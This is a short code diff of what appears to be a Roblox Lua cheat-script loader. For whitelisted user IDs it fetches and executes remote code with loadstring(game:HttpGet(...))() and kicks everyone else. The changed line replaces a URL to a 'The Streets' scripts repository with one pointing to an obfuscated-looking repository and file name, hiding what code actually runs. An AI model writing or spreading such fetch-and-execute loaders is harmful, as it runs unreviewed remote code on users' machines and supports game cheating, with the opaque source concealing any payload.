@@ -17,7 +17,7 @@ local WhitelistedIds = {
 }
 
 if table.find(WhitelistedIds, Player.UserId) then
-    loadstring(game:HttpGet"https://raw.githubusercontent.com/Wxste/Roblox-The-Streets-Scripts/main/Soul%20Ware%20Test")()
+    loadstring(game:HttpGet"https://raw.githubusercontent.com/li11k11m1o1o1op11o/jscascakscakas/main/saodsaodosodsaosdkaoasdAAAAAA")()
 else
     Player:Kick("You are not whitelisted ")
 end
